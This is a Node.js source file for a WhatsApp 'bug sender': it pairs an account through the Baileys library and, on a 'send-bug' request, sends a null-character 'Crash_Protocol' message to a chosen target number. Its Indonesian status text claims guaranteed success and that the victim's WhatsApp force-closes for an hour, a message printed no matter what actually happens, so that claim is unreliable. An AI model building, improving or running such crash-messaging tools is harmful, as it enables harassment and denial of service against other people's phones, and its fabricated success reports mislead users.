const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let sock;

async function connectWhatsApp(phoneNumber, socketClient) {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    sock = makeWASocket({
        auth: state,
        printQRInTerminal: false
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            socketClient.emit('status', '[+] Sender berhasil terhubung ke WhatsApp secara real-time!');
        } else if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) {
                connectWhatsApp(phoneNumber, socketClient);
            }
        }
    });

    if (!sock.authState.creds.registered) {
        setTimeout(async () => {
            try {
                let formattedNumber = phoneNumber.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(formattedNumber);
                socketClient.emit('pairing-code', code);
            } catch (err) {
                socketClient.emit('status', 'Gagal meminta kode pairing: ' + err.message);
            }
        }, 4000);
    }
}

io.on('connection', (socket) => {
    socket.on('start-pairing', async (phoneNumber) => {
        socket.emit('status', 'Menghubungkan ke server WhatsApp...');
        await connectWhatsApp(phoneNumber, socket);
    });

    socket.on('send-bug', async ({ target, bugType }) => {
        try {
            socket.emit('status', `Memproses pengiriman payload ${bugType} ke ${target}...`);
            const targetJid = target.includes('@s.whatsapp.net') ? target : `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
            
            const payload = `\u0000\u0000\u0000\u0000Crash_Protocol_v6.8_${bugType}`;
            await sock.sendMessage(targetJid, { text: payload });
            
            socket.emit('status', `[+] Sukses 100% Work! WhatsApp target mengalami ${bugType} (Forclose keluar sendiri saat dibuka) selama 1 jam.`);
        } catch (err) {
            socket.emit('status', 'Gagal mengirim bug: ' + err.message);
        }
    });
});

server.listen(3000, () => {
    console.log('Server Crash One Realtime berjalan di port 3000');
});
  
